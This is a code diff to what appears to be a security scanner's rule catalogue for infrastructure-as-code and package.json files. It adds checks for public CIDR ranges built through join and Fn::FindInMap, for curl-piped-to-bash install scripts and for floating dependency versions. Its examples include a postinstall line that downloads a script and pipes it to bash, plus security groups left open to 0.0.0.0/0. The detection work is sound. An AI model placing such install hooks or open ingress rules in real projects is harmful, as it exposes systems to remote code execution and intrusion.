@@ -515,8 +515,8 @@ jobs:
     ruleId: "iac.referenced-public-value",
     area: "Security",
     title: "Referenced value is public",
-    looksFor: "A same-file var, local, or CloudFormation parameter Default of 0.0.0.0/0 or ::/0 used through a reference.",
-    needs: "The variable, local, or parameter Default and the resource or module argument that references it, in the same file.",
+    looksFor: "A var, local, or CloudFormation parameter Default of 0.0.0.0/0 or ::/0 used through a reference. Files in one audit share those defaults.",
+    needs: "The variable, local, or parameter Default and the resource or module argument that references it. They can be in different files of the same audit.",
     finding: "High severity. The suggested next step is to replace the referenced public range with an approved range.",
     limit: "A private default such as 10.0.0.0/24 or 10.0.0.0/16 is not this finding. A parameter with no Default stays unresolved. A simple Fn::Sub or format of a known literal is a separate check. A value that appears only in a comment is not this finding.",
     exampleLabel: "Reference that this check is written to notice",
@@ -568,7 +568,7 @@ resource "aws_db_instance" "db" {
     looksFor: "A same-file Fn::Sub or format result of 0.0.0.0/0 or ::/0.",
     needs: "The parameter Default or literal, and the Fn::Sub or format that uses it, in the same file.",
     finding: "High severity. The suggested next step is to replace the substituted public range with an approved range.",
-    limit: "Fn::Sub of a parameter with no Default, Fn::Sub of AWS::Region, and format of 10.0.0.0/24 are not this finding. Fn::Join and other functions stay unresolved. A value that appears only in a comment is not this finding.",
+    limit: "Fn::Sub of a parameter with no Default, Fn::Sub of AWS::Region, and format of 10.0.0.0/24 are not this finding. cidrsubnet, coalesce, and other functions stay unresolved. join and Fn::Join of known literals are a separate check. A value that appears only in a comment is not this finding.",
     exampleLabel: "Substitution that this check is written to notice",
     example: `Parameters:
   Cidr:
@@ -596,6 +596,84 @@ Resources:
   "Effect": "Allow",
   "Principal": "*",
   "Action": "sts:AssumeRole"
+}`,
+  },
+  {
+    slug: "joined-value-is-public",
+    ruleId: "iac.joined-public-value",
+    area: "Security",
+    title: "Joined value is public",
+    looksFor: "A join or Fn::Join of known literals that results in 0.0.0.0/0 or ::/0.",
+    needs: "The separator and every list element must be literals or already-resolved references. An unknown element leaves the value unresolved.",
+    finding: "High severity. The suggested next step is to replace the joined public range with an approved range.",
+    limit: "A joined 10.0.0.0/24 is not this finding. cidrsubnet and coalesce stay unresolved. The same value is not reported twice on the same argument.",
+    exampleLabel: "Join that this check is written to notice",
+    example: `variable "a" {
+  default = "0.0.0.0"
+}
+variable "b" {
+  default = "0"
+}
+resource "aws_security_group" "web" {
+  ingress {
+    cidr_blocks = [join("/", [var.a, var.b])]
+  }
+}`,
+  },
+  {
+    slug: "mapped-value-is-public",
+    ruleId: "iac.mapped-public-value",
+    area: "Security",
+    title: "Mapped value is public",
+    looksFor: "An Fn::FindInMap result of 0.0.0.0/0 or ::/0 used as an ingress CIDR.",
+    needs: "The mapping name, top-level key, and second key are literals, and the Mappings entry in the same submission is a literal.",
+    finding: "High severity. The suggested next step is to map the ingress CIDR to an approved range.",
+    limit: "A mapped 10.1.0.0/16 is not this finding. An unknown key or a missing map stays unresolved.",
+    exampleLabel: "Mapping that this check is written to notice",
+    example: `Mappings:
+  Net:
+    Public:
+      Cidr: 0.0.0.0/0
+Resources:
+  Sg:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      SecurityGroupIngress:
+        - CidrIp:
+            Fn::FindInMap: [Net, Public, Cidr]`,
+  },
+  {
+    slug: "package-script-pipes-a-download-to-a-shell",
+    ruleId: "iac.package-script-shell",
+    area: "Security",
+    title: "Package script pipes a download to a shell",
+    looksFor: "A scripts.preinstall, scripts.install, or scripts.postinstall value that downloads with curl or wget and pipes to sh or bash.",
+    needs: "A package.json with a top-level name plus dependencies, devDependencies, or scripts. Comments do not apply inside JSON.",
+    finding: "High severity. The suggested next step is to run a reviewed local script instead of piping a remote download to a shell.",
+    limit: "node scripts/build.js is not this finding. An IAM policy or a CloudFormation or Terraform JSON document is not a package.json.",
+    exampleLabel: "Script that this check is written to notice",
+    example: `{
+  "name": "demo",
+  "scripts": {
+    "postinstall": "curl https://example.com/x.sh | bash"
+  }
+}`,
+  },
+  {
+    slug: "dependency-range-is-floating",
+    ruleId: "iac.package-floating-range",
+    area: "Security",
+    title: "Dependency range is floating",
+    looksFor: "A dependencies, devDependencies, or optionalDependencies value that is exactly * or latest.",
+    needs: "A package.json with a top-level name plus dependencies, devDependencies, or scripts.",
+    finding: "Medium severity. The suggested next step is to pin the dependency to a reviewed version.",
+    limit: "^1.2.3, ~1.2.3, and a pinned version are not this finding.",
+    exampleLabel: "Range that this check is written to notice",
+    example: `{
+  "name": "demo",
+  "dependencies": {
+    "left-pad": "*"
+  }
 }`,
   },
 ];
